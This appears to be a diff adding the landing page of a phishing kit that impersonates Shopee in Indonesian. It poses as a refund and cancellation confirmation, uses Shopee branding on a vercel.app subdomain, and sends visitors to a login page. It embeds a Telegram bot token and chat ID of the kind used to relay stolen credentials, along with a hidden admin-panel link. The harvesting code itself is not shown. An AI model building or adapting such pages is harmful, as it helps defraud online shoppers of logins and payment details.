@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>pembatalan dan pengembalian dana</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Pembatalan dan Pengembalian Dana - Shopee">
+    <meta property="og:description" content="Konfirmasi pembatalan dan pengembalian dana Anda di Shopee. Klik untuk melanjutkan proses.">
+    <meta property="og:image" content="https://bylinkofficial.shopee.vercel.app/asset/shopee.jpg">
+    <meta property="og:url" content="https://bylinkofficial.shopee.vercel.app">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Shopee">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Pembatalan dan Pengembalian Dana - Shopee">
+    <meta name="twitter:description" content="Konfirmasi pembatalan dan pengembalian dana Anda di Shopee.">
+    <meta name="twitter:image" content="https://bylinkofficial.shopee.vercel.app/asset/shopee.jpg">
+
+    <style>
+        .home-page {
+            background: url('asset/shopee.jpg') no-repeat center center;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .title {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        #btnku {
+            width: 280px;
+            height: 40px;
+            border: none;
+            background: #EE5D30;
+            color: #fff;
+            font-weight: bold;
+            box-shadow: 0 5px 5px rgba(65, 72, 86, 0.3);
+            border-radius: 50px;
+            cursor: pointer;
+        }
+
+        #btnku:hover {
+            background: #BA441F;
+        }
+
+        .tips {
+            color: white;
+            font-size: 18px;
+            text-align: center;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .admin-access {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.1);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            text-decoration: none;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="home-page" id="homePage">
+        <button id="btnku" type="button" onclick="window.location.href='login.html'">KONFIRMASI SEKARANG</button>
+    </div>
+
+    <a href="admin.html" class="admin-access" id="adminLink">Admin Panel</a>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            TELEGRAM_BOT_TOKEN: '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc',
+            TELEGRAM_CHAT_ID: '8593139959'
+        };
+
+        // Check for admin access
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('admin') === 'true') {
+                document.getElementById('adminLink').style.display = 'block';
+            }
+        };
+    </script>
+</body>
+</html>
